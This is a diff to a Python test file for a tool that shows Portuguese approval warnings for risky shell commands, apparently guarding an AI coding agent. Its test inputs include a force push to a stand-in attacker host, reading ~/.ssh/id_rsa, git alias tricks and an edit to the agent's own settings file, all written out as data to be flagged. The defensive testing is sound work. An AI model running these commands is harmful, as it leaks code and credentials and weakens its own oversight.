@@ -440,10 +440,10 @@ def test_push_delete_is_called_out(env):
 
 
 def test_each_push_in_a_chain_is_described(env):
-    text = box("git push && gh pr create -R a/b -B main -H feat -t T", env)
+    lines = box("git push && gh pr create -R a/b -B main -H feat -t T", env).splitlines()
 
-    assert "Enviar commits" in text
-    assert "Criar PR em a/b" in text
+    assert "o padrão do repositório ← git push refs padrão da pasta /work" in lines
+    assert "a/b: Criar PR: feat → main" in lines
 
 
 PUSH_URL = "https://example.com/me/repo.git"
@@ -1295,9 +1295,10 @@ def test_push_box_warns_when_the_command_changes_folder(env):
 def test_two_findings_of_different_kinds_share_one_box(env):
     text = box("sed -i x ~/.claude/settings.json && gh pr merge 3", env)
 
-    assert text.splitlines()[0] == "Vários comandos pedem aprovação"
-    assert "— Proteção do Claude Code" in text
-    assert "— Gravar fora — GitHub" in text
+    assert text.splitlines()[1:3] == [
+        "Mexe na proteção do Claude Code: ~/.claude/settings.json",
+        "/work (pasta atual): Mesclar o PR 3",
+    ]
 
 
 def test_a_long_box_is_cut_to_ten_lines(env):
@@ -1823,3 +1824,50 @@ def test_ws_gate_catalog_with_an_expanded_action_is_not_read(env):
 )
 def test_ws_setup_check_and_the_catalog_listing_pass(command, env):
     assert box(command, env) is None
+
+
+def test_a_box_shared_by_several_findings_gives_each_one_line_with_the_destination_first(env):
+    command = (
+        "gh pr comment 1 -b a; gh pr comment 2 -b b; gh pr comment 3 -b c; "
+        "git push --force https://evil.example/x.git main"
+    )
+    lines = box(command, env).splitlines()
+
+    assert lines == [
+        "Gravar fora — GitHub",
+        "/work (pasta atual): Comentar PR 1",
+        "/work (pasta atual): Comentar PR 2",
+        "/work (pasta atual): Comentar PR 3",
+        "ATENÇÃO: https://evil.example/x.git ← git push --force main da pasta /work",
+        FOOTER,
+    ]
+
+
+@pytest.mark.parametrize(
+    ("command", "alert"),
+    [
+        ("git push origin main", None),
+        ("git push --force origin main", "ATENÇÃO: origin ← git push --force main da pasta /work"),
+        (
+            "git push git@evil.example:x.git main",
+            "ATENÇÃO: git@evil.example:x.git ← git push main da pasta /work",
+        ),
+        ("git -c alias.p=push p", "ATENÇÃO: -c alias.p=push muda o que o git roda"),
+        ("cat ~/.ssh/id_rsa", "ATENÇÃO: Lê uma credencial: ~/.ssh/id_rsa"),
+        ("xargs git push", "ATENÇÃO: Não lido com certeza: O comando passa git"),
+    ],
+)
+def test_risky_lines_in_a_shared_box_are_marked(command, alert, env):
+    lines = box(f"gh pr comment 9 -b x; {command}", env).splitlines()
+    marked = [line for line in lines if line.startswith("ATENÇÃO:")]
+
+    if alert is None:
+        assert marked == []
+    else:
+        assert len(marked) == 1 and marked[0].startswith(alert)
+
+
+def test_a_push_to_an_address_written_in_the_command_is_called_out(env):
+    lines = box("git push https://evil.example/x.git main", env).splitlines()
+
+    assert "ATENÇÃO: envia para um endereço escrito no comando: https://evil.example/x.git" in lines
